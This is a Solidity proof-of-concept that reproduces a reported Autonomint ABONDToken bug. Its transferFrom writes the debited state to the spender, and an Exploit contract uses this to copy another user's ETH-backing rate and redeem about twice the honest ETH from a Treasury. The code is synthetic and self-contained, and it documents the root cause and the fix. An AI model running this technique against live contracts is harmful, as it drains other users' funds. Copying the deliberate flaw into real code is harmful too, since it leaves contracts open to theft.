// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Autonomint — ABONDToken::transferFrom does not work as intended and
    allows theft of ETH funds from Treasury
    (Sherlock 2024-11-autonomint, #45462, H-9)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable ABONDToken.transferFrom body is reduced with the blamed
    `userStates[msg.sender] = fromState` assignment preserved (should be
    `userStates[from]`). That duplicates a high-ethBacked State onto the
    spender; redeeming against Treasury then pays inflated ETH (no fork,
    no cheats).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: after Colors::_debit on the `from` State, the result is
    written to userStates[msg.sender] instead of userStates[from]. The
    true owner keeps their full ethBacked State, while the spender inherits
    a quasi-copy of the rich State and can redeemYields for more ETH than
    their real position warrants.

    Recommended fix (per report): `userStates[from] = fromState;`
//////////////////////////////////////////////////////////////*/

uint256 constant PRECISION = 1e18;
uint256 constant CUMULATIVE_PRECISION = 1e27;

struct State {
    uint128 abondBalance;
    uint128 ethBacked;
    uint256 cumulativeRate;
}

/// @dev Minimal Colors credit/debit — proportional ethBacked blend.
library Colors {
    function _credit(State memory fromState, State memory toState, uint128 value)
        internal
        pure
        returns (State memory)
    {
        // Credit `value` of ABOND onto toState, inheriting fromState's ethBacked
        // proportionally (simplified: if to empty, take from's rates; else weighted).
        if (toState.abondBalance == 0) {
            toState.ethBacked = fromState.ethBacked;
            toState.cumulativeRate = fromState.cumulativeRate;
        }
        toState.abondBalance += value;
        return toState;
    }

    function _debit(State memory fromState, uint128 value) internal pure returns (State memory) {
        require(fromState.abondBalance >= value, "debit");
        fromState.abondBalance -= value;
        // ethBacked rate is per-token and stays; balance is what matters for burn.
        return fromState;
    }
}

/// @dev Reduced ABOND token with dual ERC20 balance + userStates.
contract ABONDToken {
    string public name = "ABOND";
    string public symbol = "ABOND";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => State) public userStates;

    function mintWithState(address to, uint128 amount, uint128 ethBacked, uint256 cumulativeRate) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        State memory s = userStates[to];
        s.abondBalance += amount;
        s.ethBacked = ethBacked;
        s.cumulativeRate = cumulativeRate;
        userStates[to] = s;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "bal");
        State memory fromState = userStates[msg.sender];
        State memory toState = userStates[to];
        toState = Colors._credit(fromState, toState, uint128(value));
        userStates[to] = toState;
        fromState = Colors._debit(fromState, uint128(value));
        userStates[msg.sender] = fromState;
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    /// @dev VERBATIM reduction of ABONDToken.transferFrom
    ///      (Blockchain/.../Token/Abond_Token.sol#L147-L170).
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        // check the input params are non zero
        require(from != address(0) && to != address(0), "Invalid User");

        // get the sender and receiver state
        State memory fromState = userStates[from];
        State memory toState = userStates[to];

        // update receiver state
        toState = Colors._credit(fromState, toState, uint128(value));
        userStates[to] = toState;

        // update sender state
        fromState = Colors._debit(fromState, uint128(value));
        userStates[msg.sender] = fromState; // @> VULN: writes debited State to msg.sender, NOT to `from`
        // FIX: userStates[from] = fromState;

        // transfer abond
        uint256 a = allowance[from][msg.sender];
        require(a >= value, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - value;
        require(balanceOf[from] >= value, "bal");
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }

    function burnFrom(address from, uint256 value) external {
        uint256 a = allowance[from][msg.sender];
        require(a >= value, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - value;
        require(balanceOf[from] >= value, "bal");
        balanceOf[from] -= value;
        totalSupply -= value;
        State memory s = userStates[from];
        if (s.abondBalance >= value) {
            s.abondBalance -= uint128(value);
        } else {
            s.abondBalance = 0;
        }
        userStates[from] = s;
    }
}

/// @dev Reduced Treasury/Borrowing redeem path: pays ETH from ethBacked * amount.
contract Treasury {
    ABONDToken public abond;
    address public core; // onlyCoreContracts

    constructor(ABONDToken _abond) {
        abond = _abond;
        core = msg.sender;
    }

    function setCore(address c) external {
        require(msg.sender == core, "core");
        core = c;
    }

    /// @dev Reduced withdrawFromIonicByUser + redeemYields path.
    ///      redeemAmount = aBondAmount * ethBacked / PRECISION
    ///      (cumulativeRate terms cancelled when currentRate == userRate).
    function redeemYields(address user, uint128 aBondAmount) external returns (uint256) {
        require(msg.sender == user || msg.sender == core, "auth");
        (, uint128 ethBacked, ) = abond.userStates(user);
        // depositedAmount = aBondAmount * ethBacked / PRECISION
        uint256 redeemAmount = (uint256(aBondAmount) * uint256(ethBacked)) / PRECISION;

        // Burn the ERC20 (as real BorrowLib does).
        abond.burnFrom(user, aBondAmount);

        require(address(this).balance >= redeemAmount, "treasury eth");
        (bool sent, ) = payable(user).call{value: redeemAmount}("");
        require(sent, "Failed to send Ether");
        return redeemAmount;
    }

    receive() external payable {}
}

/// @dev Account helper that can approve / transferFrom / redeem and receive ETH.
contract Account {
    receive() external payable {}

    function approve(ABONDToken t, address spender, uint256 v) external {
        t.approve(spender, v);
    }

    function doTransferFrom(ABONDToken t, address from, address to, uint256 v) external {
        t.transferFrom(from, to, v);
    }

    function redeem(Treasury treasury, uint128 amount) external returns (uint256) {
        // Approve treasury to burnFrom
        treasury.abond().approve(address(treasury), amount);
        return treasury.redeemYields(address(this), amount);
    }
}

/// @notice Orchestrator.
/// CREATE order: (1) abond (2) treasury (3) account1 (4) account2 (5) account3
contract Exploit {
    ABONDToken public abond;   // CREATE nonce 1 — vulnerable
    Treasury public treasury;  // CREATE nonce 2
    Account public account1;   // CREATE nonce 3 — rich ethBacked
    Account public account2;   // CREATE nonce 4 — poor ethBacked, attacker
    Account public account3;   // CREATE nonce 5 — dust receiver

    uint128 public constant RICH_AMOUNT = 100 ether;
    uint128 public constant POOR_AMOUNT = 10 ether;
    uint128 public constant RICH_ETH_BACKED = 2 ether; // 2 ETH per ABOND
    uint128 public constant POOR_ETH_BACKED = 1 ether; // 1 ETH per ABOND

    constructor() {
        abond = new ABONDToken();
        treasury = new Treasury(abond);
        account1 = new Account();
        account2 = new Account();
        account3 = new Account();
        treasury.setCore(address(this));
    }

    function run() external {
        // Fund treasury with enough ETH to pay inflated redemption.
        require(address(this).balance >= 50 ether, "need ETH for treasury");
        (bool ok, ) = address(treasury).call{value: 50 ether}("");
        require(ok, "fund treasury");

        // Seed positions: account1 rich, account2 poor.
        abond.mintWithState(address(account1), RICH_AMOUNT, RICH_ETH_BACKED, CUMULATIVE_PRECISION);
        abond.mintWithState(address(account2), POOR_AMOUNT, POOR_ETH_BACKED, CUMULATIVE_PRECISION);

        // Honest redeemable for account2 before attack: 10 * 1 = 10 ETH.
        uint256 honestRedeemable = (uint256(POOR_AMOUNT) * uint256(POOR_ETH_BACKED)) / PRECISION;

        // Attack path:
        // 1. account1 approves account2 for 1 wei ABOND
        account1.approve(abond, address(account2), 1);
        // 2. account2 transferFrom(account1 → account3, 1)
        //    BUG: userStates[account2] gets account1's debited State (ethBacked=2e18)
        account2.doTransferFrom(abond, address(account1), address(account3), 1);

        (, uint128 ethBacked2After, ) = abond.userStates(address(account2));
        require(ethBacked2After == RICH_ETH_BACKED, "state not duplicated onto attacker");

        // account1's ethBacked was NOT debited (still rich) — also broken accounting.
        (, uint128 ethBacked1After, ) = abond.userStates(address(account1));
        require(ethBacked1After == RICH_ETH_BACKED, "from state incorrectly left intact");

        // 3. account2 redeems its full ERC20 balance under the inflated ethBacked.
        uint256 bal2 = abond.balanceOf(address(account2));
        uint256 before = address(account2).balance;
        // Core (this) must allow redeem; Account.redeem calls treasury as user=account2.
        // Treasury.redeemYields requires msg.sender == user || core. Account calls as itself (=user). OK.
        // But burnFrom needs allowance from account2 to treasury — set inside Account.redeem.
        // Treasury.core is this Exploit — Account is the user, so auth passes via msg.sender==user.

        // Need treasury to accept burnFrom: account2 approves treasury inside redeem().
        // Also set core so we could call on behalf — not needed.
        uint256 withdrawn = account2.redeem(treasury, uint128(bal2));
        uint256 got = address(account2).balance - before;

        require(got == withdrawn, "xfer");
        require(got > honestRedeemable, "no inflation");
        // With ethBacked=2e18 and bal≈10e18, got ≈ 20 ETH vs honest 10 ETH.
        require(got >= honestRedeemable * 2 - 1, "expected ~2x ethBacked theft");
    }

    receive() external payable {}
}
